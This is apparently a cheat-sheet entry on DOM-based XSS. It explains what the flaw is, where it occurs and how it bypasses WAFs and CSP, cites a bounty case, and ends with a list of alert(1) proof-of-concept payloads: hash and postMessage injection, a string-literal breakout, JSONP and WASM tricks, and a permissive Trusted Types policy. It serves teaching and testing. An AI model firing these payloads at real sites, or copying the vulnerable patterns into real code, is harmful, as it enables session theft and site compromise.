DOM XSS

What it is

Source and sink both live in browser; no HTTP round-trip. WAF never sees it.

Why it happens

JavaScript reads user data (URL, hash, postMessage) and feeds it straight into sinks like innerHTML, eval, document.write.

Where you’ll meet it

SPA routers, hash-based tabs, postMessage widgets, WebAssembly loaders, Trusted-Types default policies.

Impact

Bypasses server-side controls, CSP, WAF, cache; perfect for supply-chain back-door (see 2024 Polyfill.io again).

Mini case-study

2023 TikTok Lite DOM XSS via postMessage → stolen session tokens → $3 500 bounty.

Payloads

// URL hash directly inserted
https://target.com/app#<img src=x onerror=alert(1)>
// Any origin can send
opener.postMessage({html:'<script>alert(1)</script>'},'*')
// User lands inside JS string literal
setTimeout("animate('"+user+"')",0);  // user = "',alert(1),'"
// Script tag inside JSON string still executes
callback({"user":"John<script>alert(1)</script>"})
// WASM exports JS eval
fetch('data:application/wasm;base64,…')
.then(r=>WebAssembly.instantiateStreaming(r))
.then(o=>o.instance.exports._emscripten_run_script('alert(1)'))
// Default policy allows anything
TrustedTypes.createPolicy('default',{createHTML:s=>s});
